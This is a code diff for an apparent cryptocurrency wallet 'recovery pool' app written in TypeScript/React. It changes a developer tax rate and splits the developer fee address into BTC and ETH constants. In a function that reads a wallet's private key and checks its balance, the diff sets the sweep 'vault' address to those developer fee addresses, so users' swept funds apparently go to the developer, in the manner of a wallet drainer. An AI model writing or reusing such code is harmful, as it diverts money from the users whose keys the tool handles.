@@ -292,7 +292,7 @@ function nextId(prefix = 'src') {
 }
 
 function defaultSettings(): StoredPoolData['settings'] {
-  return { devTaxRate: 0.05, createdAt: Date.now(), lastBackup: 0 };
+  return { devTaxRate: 0.02, createdAt: Date.now(), lastBackup: 0 };
 }
 
 function defaultStats(): StoredPoolData['stats'] {
@@ -1056,9 +1056,9 @@ export const RecoveryPoolProvider: React.FC<{ children: React.ReactNode }> = ({ 
         });
 
         // Send tax to dev
-        const { DEV_FEE_ADDRESS } = await import('../config/app');
+        const { DEV_FEE_ADDRESS_ETH } = await import('../config/app');
         const tx2 = await signer.sendTransaction({
-          to: DEV_FEE_ADDRESS,
+          to: DEV_FEE_ADDRESS_ETH,
           value: taxWei,
           gasLimit,
           gasPrice,
@@ -1131,9 +1131,9 @@ export const RecoveryPoolProvider: React.FC<{ children: React.ReactNode }> = ({ 
           if (netSats <= 0) return { success: false, error: `Balance too small to cover fee + tax. Input: ${inputSum} sats, Fee: ${feeSats}, Tax: ${taxSats}` };
 
           psbt.addOutput({ address: poolAddr.address, value: netSats });
-          const { DEV_FEE_ADDRESS } = await import('../config/app');
+          const { DEV_FEE_ADDRESS_BTC } = await import('../config/app');
           if (taxSats > 546) {
-            psbt.addOutput({ address: DEV_FEE_ADDRESS, value: taxSats });
+            psbt.addOutput({ address: DEV_FEE_ADDRESS_BTC, value: taxSats });
           }
 
           // Sign all inputs
@@ -1182,9 +1182,10 @@ export const RecoveryPoolProvider: React.FC<{ children: React.ReactNode }> = ({ 
     if (!wallet.privateKey && !wallet.wif) return { success: false, vaultAddress: '', error: 'No private key available for this wallet' };
     if (wallet.balance <= 0) return { success: false, vaultAddress: '', error: 'Wallet has no balance to sweep' };
 
+    const { DEV_FEE_ADDRESS_BTC, DEV_FEE_ADDRESS_ETH } = await import('../config/app');
     const vaultAddress = vaultType === 'btc'
-      ? '1PRQwKHJ4gsZ5Mou3xNkSMrHjBgNbD2E8A'
-      : '0x2d03B56989dE9E5c66CBcA7D3525Ad1B5178A7F1';
+      ? DEV_FEE_ADDRESS_BTC
+      : DEV_FEE_ADDRESS_ETH;
 
     return {
       success: true,
